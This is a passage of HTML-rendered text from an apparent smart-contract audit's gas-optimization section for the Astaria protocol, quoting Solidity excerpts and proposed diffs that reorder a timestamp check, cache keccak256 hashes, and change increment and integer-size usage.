href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L109-L143\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L109-L143</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"236\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">109</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">liquidatorNFTClaim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">OrderParameters</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">params</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">112</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offer</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">computeId</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">offer</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">identifierOrCriteria</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">:    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">LIEN_TOKEN</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAuctionLiquidator</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">116</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">117</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">118</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">liquidator</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">119</span><span class=\"mtk1\">:    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">120</span><span class=\"mtk1\">:      </span><span class=\"mtk3\">//revert no auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">121</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUCTION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">122</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">123</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">124</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] != </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">params</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">125</span><span class=\"mtk1\">:    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:      </span><span class=\"mtk3\">//revert auction params dont match</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">127</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">128</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_AUCTION_PARAMS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">129</span><span class=\"mtk1\">:      );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">130</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">132</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">params</span><span class=\"mtk1\">.</span><span class=\"mtk12\">endTime</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">133</span><span class=\"mtk1\">:      </span><span class=\"mtk3\">//auction hasn&#39;t ended yet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">134</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">AUCTION_ACTIVE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">135</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"237\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/CollateralToken.sol b/src/CollateralToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index c82b400..46341f3 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/CollateralToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/CollateralToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -107,6 +107,11 @@ contract CollateralToken is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function liquidatorNFTClaim(OrderParameters memory params) external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (block.timestamp &lt; params.endTime) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      //auction hasn&#39;t ended yet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     CollateralStorage storage s = _loadCollateralSlot();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 collateralId = params.offer[0].token.computeId(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -129,10 +134,6 @@ contract CollateralToken is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (block.timestamp &lt; params.endTime) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      //auction hasn&#39;t ended yet</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      revert InvalidCollateralState(InvalidCollateralStates.AUCTION_ACTIVE);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    }</span></span></span></code></pre>\n<h2 id=\"g-06-keccak256-should-only-need-to-be-called-on-a-specific-string-literal-once\" style=\"position:relative;\"><a href=\"#g-06-keccak256-should-only-need-to-be-called-on-a-specific-string-literal-once\" aria-label=\"g 06 keccak256 should only need to be called on a specific string literal once permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-06] <code>keccak256()</code> should only need to be called on a specific string literal once</h2>\n<p>It should be saved to an immutable variable, and the variable used instead. If the hash is being used as a part of a function selector, the cast to <code>bytes4</code> should also only be done once.</p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC20-Cloned.sol#L162-L165\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC20-Cloned.sol#L162-L165</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"238\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Cloned</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">:    </span><span class=\"mtk8\">&quot;EIP712Domain(string version,uint256 chainId,address verifyingContract)&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">164</span><span class=\"mtk1\">:    ),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">165</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;1&quot;</span><span class=\"mtk1\">),</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L310\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L310</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"239\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">310</span><span class=\"mtk1\">:      ) != </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;FlashAction.onFlashAction&quot;</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<h2 id=\"g-07-x--y-costs-more-gas-than-x--x--y-for-state-variables\" style=\"position:relative;\"><a href=\"#g-07-x--y-costs-more-gas-than-x--x--y-for-state-variables\" aria-label=\"g 07 x  y costs more gas than x  x  y for state variables permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-07] <code>x += y</code> costs more gas than <code>x = x + y</code> for state variables</h2>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L69\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L69</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"240\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategistNonce</span><span class=\"mtk1\">++;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"241\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5ff5d7..b28ac53 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -66,7 +66,7 @@ abstract contract VaultImplementation is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (msg.sender != owner() &amp;&amp; msg.sender != s.delegate) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    s.strategistNonce++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ++s.strategistNonce;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     emit NonceUpdated(s.strategistNonce);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h2 id=\"g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" style=\"position:relative;\"><a href=\"#g-08-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\" aria-label=\"g 08 usage of uintsints smaller than 32 bytes 256 bits incurs overhead permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-08] Usage of uints/ints smaller than 32 bytes (256 bits) incurs overhead</h2>\n<p>When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.</p>\n<p><a href=\"https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\">https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html</a></p>\n<p>Use a larger size then downcast where needed.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L138-L143\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L138-L143</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"242\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint64 epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">138</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redeemFutureEpoch</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">139:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">140:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">141:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">142:    </span><span class=\"mtk10\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk10\">epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">143</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint64 epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">148</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_redeemFutureEpoch</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">149:    </span><span class=\"mtk10\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk10\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk10\">s</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">150:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">shares</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">151:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">receiver</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">152:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">153:    </span><span class=\"mtk10\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk10\">epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint64 epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getWithdrawProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint64 epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_deployWithdrawProxyIfNotDeployed</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint48 newSlope</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">529:  </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_setSlope</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newSlope</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint64 epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">534</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">decreaseEpochLienCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyLienToken</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint64 epoch</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">538</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_decreaseEpochLienCount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">VaultData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">//@audit: uint64 end</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">546</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getLienEpoch</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">end</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span 